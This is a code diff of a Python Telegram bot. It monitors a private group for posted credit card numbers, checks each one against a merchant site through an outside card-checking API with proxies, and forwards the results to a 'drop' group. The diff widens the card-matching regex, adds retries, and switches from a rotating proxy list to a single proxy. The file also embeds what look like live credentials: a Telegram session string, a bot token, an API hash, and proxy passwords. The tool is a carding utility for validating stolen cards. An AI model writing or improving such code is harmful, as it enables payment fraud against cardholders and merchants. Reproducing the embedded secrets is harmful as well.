@@ -1,12 +1,12 @@
 import re
 import aiohttp
 import asyncio
+import random
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telegram import Bot
 from telegram.helpers import escape_markdown
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-import random
 
 # ---------------- CONFIG ----------------
 api_id = 17455551
@@ -14,32 +14,20 @@ api_hash = "abde39d2fad230528b2695a14102e76a"
 SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
 BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"
 
-PRIVATE_GROUP_ID = -1002682944548
-TARGET_GROUP_ID = -1002968335063
-ADMIN_ID = 8493360284  # Your Telegram ID
+PRIVATE_GROUP_ID = -1002682944548  # Group to monitor
+TARGET_GROUP_ID = -1002968335063   # Official drop group
+ADMIN_ID = 8493360284               # Admin Telegram ID
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
+PROXY = "45.41.172.51:5794:juftilus:atasaxde44jl"  # Only one proxy used
 
-# List of proxies (rotate randomly)
-PROXIES = [
-    "45.41.172.51:5794:juftilus:atasaxde44jl",
-    "45.41.177.238:5888:juftilus:atasaxde44jl",
-    "92.113.7.244:6970:juftilus:atasaxde44jl",
-    "108.165.197.189:6428:juftilus:atasaxde44jl",
-    "23.27.209.235:6254:juftilus:atasaxde44jl",
-    "82.29.225.78:5933:juftilus:atasaxde44jl",
-    "23.27.184.87:5688:juftilus:atasaxde44jl",
-    "31.59.27.148:6725:juftilus:atasaxde44jl",
-    "67.227.113.12:5552:juftilus:atasaxde44jl"
-]
+NUM_WORKERS = 5  # concurrent card processors
 
-# Regex to match multiple card formats
+# Regex to match almost all common CC formats
 CARD_REGEX = re.compile(
-    r"(\d{15,16})\s*[\/|]?\s*(\d{2})[\/|]?(\d{2,4})\s*[\/|]?\s*(\d{3,4})"
+    r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
 )
-
-NUM_WORKERS = 15  # number of concurrent workers
 
 # ---------------- CLIENTS ----------------
 user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
@@ -54,17 +42,18 @@ session = None  # aiohttp session
 async def process_card(card: str):
     """Send card to API and forward result if dropping enabled"""
     global session
-    proxy = random.choice(PROXIES)
-    params = {"site": SITE, "cc": card, "proxy": proxy}
+    params = {"site": SITE, "cc": card, "proxy": PROXY}
 
-    try:
-        async with session.get(API_URL, params=params, timeout=15) as resp:
-            data = await resp.json()
-    except Exception as e:
-        data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
-        print(f"❌ API error for card {card}: {e}")
+    for attempt in range(3):  # retry 3 times
+        try:
+            async with session.get(API_URL, params=params, timeout=20) as resp:
+                data = await resp.json()
+                break
+        except Exception as e:
+            print(f"❌ API error for card {card} (attempt {attempt+1}): {e}")
+            data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
+            await asyncio.sleep(1)
 
-    # Escape for MarkdownV2
     cc = escape_markdown(str(data.get('cc')), version=2)
     price = escape_markdown(str(data.get('Price')), version=2)
     response = escape_markdown(str(data.get('Response')), version=2)
@@ -93,9 +82,11 @@ async def card_listener(event):
     text = event.message.message
     if not text:
         return
+
     matches = CARD_REGEX.findall(text)
     if not matches:
         return
+
     for match in matches:
         card_str = "|".join(match)
         await cards_queue.put(card_str)
@@ -136,13 +127,13 @@ async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
 # ---------------- MAIN ----------------
 async def main():
     global session
-    session = aiohttp.ClientSession()  # Single shared session
+    session = aiohttp.ClientSession()
 
     # Start Telethon client
     await user_client.start()
     print("✅ Telethon client started. Listening to private group...")
 
-    # Start workers
+    # Start card workers
     for i in range(NUM_WORKERS):
         asyncio.create_task(card_worker(i+1))
     print(f"[+] {NUM_WORKERS} card workers running...")
@@ -158,7 +149,7 @@ async def main():
     await app.updater.start_polling()
     print("✅ Telegram bot started. Waiting for admin commands...")
 
-    # Keep running Telethon
+    # Keep Telethon running
     await user_client.run_until_disconnected()
 
 if __name__ == "__main__":
